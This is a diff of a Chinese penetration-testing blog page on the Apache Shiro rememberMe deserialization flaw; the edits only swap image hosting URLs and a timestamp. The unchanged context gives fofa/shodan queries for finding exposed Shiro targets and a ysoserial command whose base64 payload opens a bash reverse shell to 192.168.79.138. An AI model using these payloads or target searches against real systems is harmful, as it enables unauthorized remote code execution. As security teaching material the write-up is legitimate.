@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="简介Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。   Shiro提供了应用程序安全性API来执行以下方面：  身份验证：证明用户身份，通常称为用户”登录”  授权：访问控制  密码术：保护或隐藏数据以防窥视  会话管理：每个用户的时间敏感状态 上述四个方面也被称为应用程序安全性的四个基石。   关于这个漏洞">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png">
 <meta property="article:published_time" content="2024-01-18T00:53:58.000Z">
-<meta property="article:modified_time" content="2024-03-22T12:35:12.950Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.472Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -301,14 +301,14 @@
 </li>
 </ul>
 <p>关于这个漏洞，本来这个漏洞很安全的，但是出现了加密密钥不修改的情况，也就是我们可以使用默认密钥进行破解，然后反序列化</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png" srcset="/img/loading.gif" lazyload alt="image-20240118140826755"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png" srcset="/img/loading.gif" lazyload alt="image-20240118140826755"></p>
 <h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="组件识别"><a href="#组件识别" class="headerlink" title="组件识别"></a>组件识别</h2><p>在访问及登录时抓包，如果响应头set-cookie中显示rememberMe&#x3D;deleteMe，说明使用了Shiro组件</p>
 <h2 id="Shiro漏洞搜索"><a href="#Shiro漏洞搜索" class="headerlink" title="Shiro漏洞搜索"></a>Shiro漏洞搜索</h2><p>  通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。  </p>
 <blockquote>
 <p> header&#x3D;”rememberme&#x3D;deleteMe”  </p>
 <p>header&#x3D;”shiroCookie”  </p>
 </blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png" srcset="/img/loading.gif" lazyload alt="image-20240118130116605"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png" srcset="/img/loading.gif" lazyload alt="image-20240118130116605"></p>
 <h2 id="shiro-漏洞检测"><a href="#shiro-漏洞检测" class="headerlink" title="shiro 漏洞检测"></a>shiro 漏洞检测</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/fupinglee/ShiroScan">https://github.com/fupinglee/ShiroScan</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a>  </p>
@@ -320,7 +320,7 @@
 <p>shiro 默认使用了 CookieRememberMeManager，其处理cookie的流程是：  获取 rememberMe的cookie值–&gt;Base64解码–&gt;AES解密 –&gt;反序列化 。  </p>
 <p>但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人  通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、  AES加密、base64编码后，作为 cookie 的 rememberMe 字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p>
 </blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png" srcset="/img/loading.gif" lazyload alt="image-20240118141011492"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png" srcset="/img/loading.gif" lazyload alt="image-20240118141011492"></p>
 <blockquote>
 <p>  只要<strong>rememberMe</strong>的<strong>AES</strong>加密密钥泄露，无论<strong>shiro</strong>是什么版本都可能会导致该漏洞的产生。硬编码是  将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 <strong>Set-Cookie</strong> 中存在  <strong>rememberMe&#x3D;deleteMe</strong> 字段，那么就可能存在此漏洞。  </p>
 </blockquote>
@@ -372,10 +372,10 @@
 <li><p>然后执行ysoserial</p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">10998</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo, YmFzaCAtaSAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 </li>
-<li><p>生成cookie<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png" srcset="/img/loading.gif" lazyload alt="image-20240118154031893"></p>
+<li><p>生成cookie<br><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png" srcset="/img/loading.gif" lazyload alt="image-20240118154031893"></p>
 </li>
 <li><p>发包</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png" srcset="/img/loading.gif" lazyload alt="image-20240118154255996"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png" srcset="/img/loading.gif" lazyload alt="image-20240118154255996"></p>
 </li>
 </ol>
 
